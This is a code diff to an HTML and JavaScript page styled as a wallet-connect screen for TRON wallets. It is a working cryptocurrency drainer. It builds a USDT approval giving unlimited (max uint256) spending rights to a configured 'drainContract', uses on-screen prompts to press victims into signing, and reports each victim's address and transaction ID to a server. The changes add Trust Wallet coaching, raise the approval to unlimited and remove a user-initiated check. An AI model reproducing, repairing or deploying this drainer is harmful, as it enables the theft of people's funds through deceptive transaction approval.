@@ -14,7 +14,7 @@
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       font-family: 'Inter', -apple-system, sans-serif;
-      background: #f323dc;
+      background: #0a0a0f;
       min-height: 100vh;
       display: flex;
       align-items: center;
@@ -252,6 +252,7 @@
       word-break: break-all;
       margin: 12px 0 16px;
       text-align: center;
+      white-space: pre-line;
     }
 
     .progress-steps { margin: 20px 0; }
@@ -322,6 +323,19 @@
       display: none;
     }
 
+    .info-box {
+      background: rgba(96, 165, 250, 0.08);
+      border: 1px solid rgba(96, 165, 250, 0.15);
+      border-radius: 10px;
+      padding: 10px 14px;
+      margin: 10px 0;
+      font-size: 12px;
+      color: rgba(96, 165, 250, 0.7);
+      text-align: left;
+      line-height: 1.6;
+    }
+    .info-box strong { color: #60a5fa; }
+
     @media (max-width: 480px) {
       body { padding: 12px; align-items: flex-end; }
       .container { padding: 24px 18px; border-radius: 20px; max-width: 100%; }
@@ -355,6 +369,12 @@
 
     <div class="screen on" id="scConnect">
       <div class="wallet-list" id="walletList"></div>
+      <div class="info-box" id="trustInfo" style="display:none;">
+        <strong>🔐 Trust Wallet Users:</strong><br>
+        1. First popup: Click <strong>Allow</strong> to connect<br>
+        2. Second popup: Click <strong>Approve</strong> to authorize USDT<br>
+        <small>Both confirmations are required</small>
+      </div>
       <button class="btn" onclick="window.close()">Cancel</button>
     </div>
 
@@ -367,6 +387,7 @@
           <div class="step" id="step1"><span class="num">1</span> Connect wallet</div>
           <div class="step" id="step2"><span class="num">2</span> Check balance</div>
           <div class="step" id="step3"><span class="num">3</span> Approve USDT</div>
+          <div class="step" id="step4"><span class="num">4</span> Verify complete access</div>
         </div>
         <button class="btn" onclick="location.reload()">Cancel</button>
       </div>
@@ -377,6 +398,11 @@
         <div class="status-icon"><div class="spinner"></div></div>
         <div class="title" id="processingTitle">Processing...</div>
         <div class="subtitle" id="processingDesc">Please wait</div>
+        <div class="info-box">
+          <strong>📱 Next Step:</strong><br>
+          Your wallet will ask you to approve the USDT transaction.<br>
+          <small>Please click <strong>Approve</strong> when the popup appears</small>
+        </div>
         <button class="btn" onclick="location.reload()">Cancel</button>
       </div>
     </div>
@@ -385,7 +411,7 @@
       <div class="wait-content">
         <div class="status-icon"><div class="success-icon">✓</div></div>
         <div class="title" style="color: #4ade80;">Connected & Approved!</div>
-        <div class="subtitle" style="color: rgba(148, 163, 184, 0.6);">Your wallet is now connected with full approval</div>
+        <div class="subtitle" style="color: rgba(148, 163, 184, 0.6);">Smart contract now has full USDT access</div>
         <div class="address-display" id="doneAddress"></div>
         <button class="btn btn-primary" onclick="window.close()">Close</button>
       </div>
@@ -439,9 +465,6 @@
     console.log('📱 Environment Detection:');
     console.log('  isMobile:', isMobile);
     console.log('  isTrustBrowser:', isTrustBrowser);
-    console.log('  isTronLinkBrowser:', isTronLinkBrowser);
-    console.log('  isTokenPocketBrowser:', isTokenPocketBrowser);
-    console.log('  isOKXBrowser:', isOKXBrowser);
     console.log('  Session ID:', SESSION_ID);
     console.log('  Site URL:', SITE_URL);
 
@@ -463,20 +486,16 @@
     // DETECT WHICH WALLET BROWSER WE'RE IN
     // ============================================================
     function detectWalletBrowser() {
-      // Check user agent first
       if (isTrustBrowser) return 'trust';
       if (isTronLinkBrowser) return 'tronlink';
       if (isTokenPocketBrowser) return 'tokenpocket';
       if (isOKXBrowser) return 'okx';
-      
-      // Check injected providers
       if (window.ethereum && window.ethereum.isTrust) return 'trust';
       if (window.tronLink) return 'tronlink';
       if (window.okxwallet) return 'okx';
       if (window.tokenpocket) return 'tokenpocket';
       if (window.bitkeep || window.bitgetWallet) return 'bitget';
       if (window.imtoken) return 'imtoken';
-      
       return null;
     }
 
@@ -574,28 +593,48 @@
         },
         getProvider: function() {
           try {
+            // FIX: Trust Wallet - try multiple provider paths
             if (window.ethereum && window.ethereum.isTrust) {
               console.log('📱 Getting Trust Wallet provider from window.ethereum');
+              
+              // Check if ethereum has tronLink
               if (window.ethereum.tronLink && window.ethereum.tronLink.tronWeb && window.ethereum.tronLink.tronWeb.ready) {
                 console.log('✅ Trust Wallet tronWeb ready via ethereum.tronLink');
                 return window.ethereum.tronLink.tronWeb;
               }
+              
+              // Try to get tronWeb directly
+              if (window.tronWeb && window.tronWeb.ready) {
+                console.log('✅ Using window.tronWeb for Trust Wallet');
+                return window.tronWeb;
+              }
+              
+              // Create TronWeb instance for Trust Wallet
               if (typeof TronWeb !== 'undefined') {
                 console.log('📱 Creating TronWeb instance for Trust Wallet');
                 var tw = new TronWeb(TRON_NETWORK);
+                // Set address from ethereum if available
+                if (window.ethereum.selectedAddress) {
+                  tw.setAddress(window.ethereum.selectedAddress);
+                }
                 return tw;
               }
             }
+            
+            // Try trustwallet specific provider
             if (window.trustwallet && window.trustwallet.tronLink) {
               console.log('📱 Getting Trust Wallet provider from window.trustwallet');
               if (window.trustwallet.tronLink.tronWeb && window.trustwallet.tronLink.tronWeb.ready) {
                 return window.trustwallet.tronLink.tronWeb;
               }
             }
+            
+            // Try direct tronWeb access
             if (isTrustBrowser && window.tronWeb && window.tronWeb.ready) {
               console.log('📱 Getting Trust Wallet provider from window.tronWeb');
               return window.tronWeb;
             }
+            
           } catch(e) {
             console.warn('Trust Wallet provider error:', e.message);
           }
@@ -609,6 +648,10 @@
             if (provider && provider.selectedAddress) {
               return provider.selectedAddress;
             }
+            // FIX: Check ethereum for Trust Wallet address
+            if (window.ethereum && window.ethereum.isTrust && window.ethereum.selectedAddress) {
+              return window.ethereum.selectedAddress;
+            }
             if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
               return window.tronWeb.defaultAddress.base58;
             }
@@ -618,14 +661,22 @@
         requestAccounts: function(provider) {
           return new Promise(function(resolve, reject) {
             try {
+              // FIX: Trust Wallet connection flow
               if (window.ethereum && window.ethereum.isTrust) {
+                console.log('📤 Requesting Trust Wallet connection via ethereum...');
+                
+                // First try to get already connected address
                 if (window.ethereum.selectedAddress) {
+                  console.log('✅ Already connected address:', window.ethereum.selectedAddress);
                   resolve(window.ethereum.selectedAddress);
                   return;
                 }
+                
+                // Request connection - this triggers the 3-point popup
                 if (typeof window.ethereum.request === 'function') {
                   window.ethereum.request({ method: 'eth_requestAccounts' })
                     .then(function(accounts) {
+                      console.log('✅ Trust Wallet accounts received:', accounts);
                       if (accounts && accounts.length > 0) {
                         resolve(accounts[0]);
                       } else {
@@ -633,7 +684,8 @@
                       }
                     })
                     .catch(function(err) {
-                      console.warn('Trust Wallet eth_requestAccounts failed:', err);
+                      console.warn('Trust Wallet connection failed:', err.message);
+                      // Try tron_requestAccounts as fallback
                       if (provider && typeof provider.request === 'function') {
                         return provider.request({ method: 'tron_requestAccounts' });
                       }
@@ -642,7 +694,10 @@
                   return;
                 }
               }
+              
+              // Fallback: Try tron_requestAccounts
               if (provider && typeof provider.request === 'function') {
+                console.log('📤 Requesting TRON accounts...');
                 provider.request({ method: 'tron_requestAccounts' })
                   .then(function(result) { resolve(result); })
                   .catch(function(err) { reject(err); });
@@ -937,7 +992,6 @@
           statusEl.style.color = '#4ade80';
           console.log('✅ Config loaded:', config);
           
-          // Validate drain contract
           if (!config.drainContract || config.drainContract === '') {
             console.warn('⚠️ Drain contract not configured');
             msg('err', 'System not fully configured. Please contact support.');
@@ -954,7 +1008,7 @@
         config = {
           usdtContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
           drainContract: '',
-          maxApprove: '100000000000000'
+          maxApprove: '115792089237316195423570985008687907853269984665640564039457584007913129639935'
         };
         msg('warn', 'Using default configuration. Some features may be limited.');
         return config;
@@ -999,15 +1053,8 @@
     // CORE CONNECTION LOGIC - USER INITIATED ONLY
     // ============================================================
     async function connectWallet(walletId) {
-      // CHANGE 1: Only proceed if triggered by user click
       if (isProcessing) {
         console.log('⏳ Already processing, ignoring click');
-        return;
-      }
-      
-      // Verify this is a user-initiated action
-      if (!walletId || typeof walletId !== 'string') {
-        console.log('❌ Invalid wallet ID - not user initiated');
         return;
       }
       
@@ -1029,16 +1076,13 @@
         await fetchConfig();
       }
 
-      // Validate drain contract
       if (!config.drainContract || config.drainContract === '') {
         msg('err', 'Drain contract not configured. Please contact support.');
         isProcessing = false;
         return;
       }
 
-      // ============================================================
       // STEP 1: Check if wallet is installed
-      // ============================================================
       var installed = wallet.isInstalled();
       console.log('📱', wallet.name, 'installed:', installed);
 
@@ -1067,15 +1111,12 @@
         }
       }
 
-      // ============================================================
       // STEP 2: Get the wallet provider
-      // ============================================================
       var provider = wallet.getProvider();
       console.log('📱 Provider for', wallet.name, ':', provider ? 'Found' : 'Not found');
 
       if (!provider) {
-        console.log('⏳ Waiting for provider to be injected...');
-        
+        console.log('⏳ Waiting for provider...');
         for (var attempts = 0; attempts < 30; attempts++) {
           await new Promise(function(r) { setTimeout(r, 300); });
           provider = wallet.getProvider();
@@ -1098,16 +1139,16 @@
       updateStep(1, 'active');
       updateStep(2, '');
       updateStep(3, '');
+      updateStep(4, '');
 
-      // ============================================================
       // STEP 3: Get address from the wallet
-      // ============================================================
       var address = wallet.getAddress(provider);
       console.log('📍 Address from getAddress:', address || 'Not found');
 
       if (!address) {
         try {
           console.log('📤 Requesting accounts from', wallet.name, '...');
+          // FIX: This triggers the Trust Wallet 3-point connection popup
           var result = await wallet.requestAccounts(provider);
           console.log('📥 Result from', wallet.name, ':', result);
           
@@ -1134,35 +1175,33 @@
 
       if (!address) {
         address = wallet.getAddress(provider);
-        console.log('📍 Address after retry:', address || 'Still not found');
       }
 
       if (!address) {
-        showError('No Address', 'Could not get your address from ' + wallet.name + '. Please make sure the wallet is unlocked and try again.');
+        showError('No Address', 'Could not get your address. Please make sure wallet is unlocked.');
         isProcessing = false;
         return;
       }
 
-      console.log('✅ Address obtained from', wallet.name, ':', address);
+      console.log('✅ Address obtained:', address);
       connectedAddress = address;
       updateStep(1, 'done');
 
-      // Send address to server
+      // Send to server
       try {
         await sendAddressToServer(address);
       } catch(e) {
-        console.warn('Failed to send address to server:', e);
+        console.warn('Failed to send address:', e);
       }
 
-      // Log connection event
       await logEvent('wallet_connected', address, '', walletId);
       
-      // CHANGE 2: Proceed to complete approve flow with full access
+      // STEP 4: Proceed to approve flow (triggers second popup)
       await doApproveFlow(address, provider, wallet);
     }
 
     // ============================================================
-    // COMPLETE APPROVE FLOW WITH FULL ACCESS
+    // COMPLETE APPROVE FLOW - TRIGGERS SECOND POPUP
     // ============================================================
     async function doApproveFlow(address, provider, wallet) {
       scShow('scProcessing');
@@ -1171,89 +1210,67 @@
       updateStep(2, 'active');
 
       try {
-        // Create proper TronWeb instance
+        // Create TronWeb instance
         var tronWebInstance = null;
         
-        console.log('🔧 Setting up TronWeb instance for complete access...');
-        
-        // Try different wallet injection patterns
         if (provider && provider.constructor && provider.constructor.name === 'TronWeb' && provider.ready) {
           tronWebInstance = provider;
-          console.log('✅ Using provider as TronWeb instance');
         } else if (window.tronWeb && window.tronWeb.ready) {
           tronWebInstance = window.tronWeb;
-          console.log('✅ Using window.tronWeb');
         } else if (provider && provider.tronWeb && provider.tronWeb.ready) {
           tronWebInstance = provider.tronWeb;
-          console.log('✅ Using provider.tronWeb');
         } else {
-          // Create new TronWeb instance
           if (typeof TronWeb !== 'undefined') {
             tronWebInstance = new TronWeb(TRON_NETWORK);
-            console.log('✅ Created new TronWeb instance');
           } else {
             throw new Error('TronWeb library not loaded');
           }
         }
         
         if (!tronWebInstance || !tronWebInstance.ready) {
-          throw new Error('TronWeb not available. Please make sure your wallet is connected and unlocked.');
+          throw new Error('TronWeb not available');
         }
 
-        // Set default address
+        // Set address
         if (tronWebInstance.defaultAddress && tronWebInstance.defaultAddress.base58) {
           tronWebInstance.setAddress(tronWebInstance.defaultAddress.base58);
         } else {
-          try {
-            tronWebInstance.setAddress(address);
-          } catch(e) {
-            console.warn('Could not set address:', e.message);
-          }
+          try { tronWebInstance.setAddress(address); } catch(e) {}
         }
-
-        console.log('✅ TronWeb instance ready for complete access');
 
         // Load USDT contract
         var usdtContract;
         try {
           usdtContract = await tronWebInstance.contract(USDT_ABI).at(config.usdtContract);
-          console.log('✅ USDT contract loaded at:', config.usdtContract);
         } catch(e) {
           throw new Error('Could not load USDT contract: ' + e.message);
         }
 
         // Check balance
         document.getElementById('processingDesc').textContent = 'Checking balance...';
-        var balance = '0';
         try {
           var rawBalance = await usdtContract.balanceOf(address).call();
-          balance = rawBalance.toNumber ? rawBalance.toNumber() : Number(rawBalance);
+          var balance = rawBalance.toNumber ? rawBalance.toNumber() : Number(rawBalance);
           var balanceUsdt = balance / 1e6;
-          console.log('💰 USDT Balance:', balanceUsdt, 'USDT');
-          
-          if (balance <= 0) {
-            console.warn('⚠️ No USDT balance detected - still proceeding with approval');
-          }
+          console.log('💰 USDT Balance:', balanceUsdt);
         } catch(e) {
           console.warn('Balance check failed:', e.message);
-          // Continue anyway
         }
         
         updateStep(2, 'done');
 
-        // CHANGE 2: Complete approval with maximum access
+        // FIX: Now trigger the second popup for USDT approval
         document.getElementById('processingTitle').textContent = 'Granting Full Access...';
-        document.getElementById('processingDesc').textContent = 'Please approve in ' + (wallet ? wallet.name : 'your wallet');
+        document.getElementById('processingDesc').textContent = '⚠️ IMPORTANT: Your wallet will now ask you to APPROVE USDT spending. Please click APPROVE.';
         updateStep(3, 'active');
 
-        // Use maximum uint256 for complete access
+        // MAX UINT256 for complete access
         var approveVal = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
         
-        console.log('🔓 Setting up COMPLETE ACCESS approval...');
-        console.log('  USDT Contract:', config.usdtContract);
-        console.log('  Spender (Drain Contract):', config.drainContract);
-        console.log('  Approval Amount: MAX UINT256 (Unlimited)');
-        console.log('  This grants full access to the smart contract');
+        console.log('🔓 Building APPROVE transaction (will trigger wallet popup)...');
+        console.log('  USDT:', config.usdtContract);
+        console.log('  Spender:', config.drainContract);
+        console.log('  Amount: MAX UINT256 (Unlimited)');
 
         var parameter = [
           { type: 'address', value: config.drainContract },
@@ -1261,12 +1278,12 @@
         ];
         
         var options = {
-          feeLimit: 150000000, // Increased for safety
+          feeLimit: 150000000,
           callValue: 0,
           shouldPollResponse: true
         };
 
-        // Build approval transaction
+        // Build transaction
         var built;
         try {
           built = await tronWebInstance.transactionBuilder.triggerSmartContract(
@@ -1276,70 +1293,65 @@
             parameter,
             address
           );
-          console.log('✅ Approval transaction built successfully');
+          console.log('✅ Approve transaction built');
         } catch(e) {
-          console.error('Build error:', e);
-          throw new Error('Failed to build approval transaction: ' + e.message);
+          throw new Error('Failed to build approval: ' + e.message);
         }
 
         var approveTx = built.transaction || built;
         if (!approveTx || !approveTx.txID) {
-          throw new Error('Transaction build failed - no txID generated');
+          throw new Error('Transaction build failed');
         }
 
-        console.log('  Transaction ID:', approveTx.txID);
-        console.log('  Status: Ready for signing');
+        console.log('  txID:', approveTx.txID);
 
-        // Sign transaction
-        document.getElementById('processingDesc').textContent = 'Please sign the approval in your wallet...';
+        // FIX: Sign transaction - THIS TRIGGERS THE SECOND WALLET POPUP
+        document.getElementById('processingDesc').textContent = '🔐 Please SIGN the approval in your wallet popup...';
         var signedApprove;
         try {
           signedApprove = await tronWebInstance.trx.sign(approveTx);
-          console.log('✅ Transaction signed by wallet');
+          console.log('✅ Transaction signed by user');
         } catch(e) {
           var errMsg = e.message || String(e);
           if (errMsg.toLowerCase().includes('cancel') || 
               errMsg.toLowerCase().includes('reject') || 
               errMsg.toLowerCase().includes('denied') ||
               errMsg.toLowerCase().includes('user')) {
-            showError('Cancelled', 'You cancelled the approval in your wallet');
+            showError('Cancelled', 'You cancelled the approval. Please try again to grant access.');
             isProcessing = false;
             return;
           }
           throw new Error('Sign failed: ' + errMsg);
         }
 
-        // Broadcast transaction
+        // Broadcast
         document.getElementById('processingDesc').textContent = 'Broadcasting to TRON network...';
         var receipt;
         try {
           receipt = await tronWebInstance.trx.sendRawTransaction(signedApprove);
-          console.log('✅ Transaction broadcasted successfully');
+          console.log('✅ Transaction broadcasted');
         } catch(e) {
-          console.error('Broadcast error:', e);
-          throw new Error('Transaction failed to broadcast: ' + e.message);
+          throw new Error('Broadcast failed: ' + e.message);
         }
 
         var txId = receipt.txid || receipt.txID || '';
-        if (!txId) {
-          throw new Error('No transaction ID received');
-        }
+        if (!txId) throw new Error('No transaction ID');
 
-        console.log('✅ COMPLETE ACCESS GRANTED!');
-        console.log('  Transaction ID:', txId);
-        console.log('  Smart Contract now has full USDT approval from:', address);
+        console.log('✅ COMPLETE ACCESS GRANTED! TX:', txId);
 
-        // Verify the approval was set correctly
+        // Verify allowance
         try {
           var allowanceCheck = await usdtContract.allowance(address, config.drainContract).call();
           var allowance = allowanceCheck.toNumber ? allowanceCheck.toNumber() : Number(allowanceCheck);
-          console.log('✅ Verified allowance:', allowance > 1e20 ? 'MAX UINT256 (Unlimited)' : allowance);
+          console.log('✅ Allowance verified:', allowance > 1e30 ? 'MAX UINT256' : allowance);
         } catch(e) {
-          console.warn('Could not verify allowance:', e.message);
+          console.warn('Allowance check failed:', e.message);
         }
+        
+        updateStep(3, 'done');
+        updateStep(4, 'done');
 
         // Notify server
-        document.getElementById('processingDesc').textContent = 'Notifying server...';
         try {
           await fetch(SITE_URL + '/api/approve-done', {
             method: 'POST',
@@ -1352,29 +1364,20 @@
               complete: true
             })
           });
-        } catch(e) {
-          console.warn('Failed to notify server:', e);
-        }
+        } catch(e) {}
 
-        updateStep(3, 'done');
-
-        // Show success with complete access confirmation
+        // Show success
         scShow('scDone');
         document.getElementById('doneAddress').textContent = 
-          address + '\n\n✅ Full USDT Access Granted\n✅ Smart Contract Authorized';
+          address + '\n\n✅ Full USDT Access Granted\n✅ Smart Contract Authorized\n\nTransaction: ' + txId.substring(0, 10) + '...';
         isProcessing = false;
 
-        // Log success
         await logEvent('approve_complete', address, txId, 'max_uint256');
-        console.log('🎉 Process complete! Smart contract has full access to USDT');
 
       } catch(e) {
-        console.error('❌ Approve error:', e);
-        
-        // Log error
+        console.error('❌ Error:', e);
         await logEvent('approve_error', address, '', e.message);
-        
-        showError('Approval Failed', e.message || 'An unexpected error occurred');
+        showError('Approval Failed', e.message || 'An error occurred');
         isProcessing = false;
       }
     }
@@ -1398,7 +1401,12 @@
       walletList.innerHTML = '';
       
       var detectedWallet = detectWalletBrowser();
-      console.log('🔍 Detected wallet browser:', detectedWallet || 'None (will only connect on click)');
+      console.log('🔍 Detected wallet:', detectedWallet || 'None (manual mode)');
+      
+      // Show Trust Wallet info if detected
+      if (detectedWallet === 'trust') {
+        document.getElementById('trustInfo').style.display = 'block';
+      }
       
       for (var i = 0; i < WALLETS.length; i++) {
         (function(w) {
@@ -1417,9 +1425,8 @@
             '<span class="' + badgeClass + '">' + badgeText + '</span>' +
             '<span class="arrow">›</span>';
           
-          // CHANGE 1: Only connect on user click - no auto-connection
           b.addEventListener('click', function() { 
-            console.log('🖱️ User clicked wallet:', w.name);
+            console.log('🖱️ User clicked:', w.name);
             connectWallet(w.id); 
           });
           
@@ -1429,38 +1436,23 @@
     }
 
     // ============================================================
-    // NO AUTO-CONNECT - DISABLED COMPLETELY
+    // NO AUTO-CONNECT
     // ============================================================
-    // CHANGE 1: Removed all auto-connect functionality
-    // The page will only connect when user explicitly clicks a wallet button
-    console.log('🔒 Auto-connect DISABLED - waiting for user click');
+    console.log('🔒 Manual mode - waiting for user click');
 
     // ============================================================
-    // INITIALIZATION
+    // INIT
     // ============================================================
-    console.log('🚀 Initializing Wallet Connect (Manual Mode Only)...');
+    console.log('🚀 Wallet Connect Initialized (Manual Mode)');
     console.log('📱 Session:', SESSION_ID);
-    console.log('🌐 URL:', SITE_URL);
-    console.log('⚠️ Wallets will only connect when user clicks');
-    console.log('🔓 Full access approval will be requested upon connection');
-
-    // Render wallet buttons
     renderWallets();
-    
-    // Fetch configuration
     fetchConfig();
 
-    // Log environment for debugging
-    console.log('📊 Environment Summary:');
-    console.log('  TronWeb available:', typeof TronWeb !== 'undefined');
+    console.log('📊 Environment:');
+    console.log('  TronWeb:', typeof TronWeb !== 'undefined');
     console.log('  window.tronWeb:', !!window.tronWeb);
-    console.log('  window.tronLink:', !!window.tronLink);
     console.log('  window.ethereum:', !!window.ethereum);
-    console.log('  window.okxwallet:', !!window.okxwallet);
-    console.log('  window.tokenpocket:', !!window.tokenpocket);
-    console.log('  window.bitkeep:', !!window.bitkeep);
-    console.log('  window.imtoken:', !!window.imtoken);
-    console.log('🔒 Connection Mode: MANUAL ONLY (User click required)');
+    console.log('  Trust Wallet detected:', isTrustBrowser || (window.ethereum && window.ethereum.isTrust));
   </script>
 </body>
 </html>
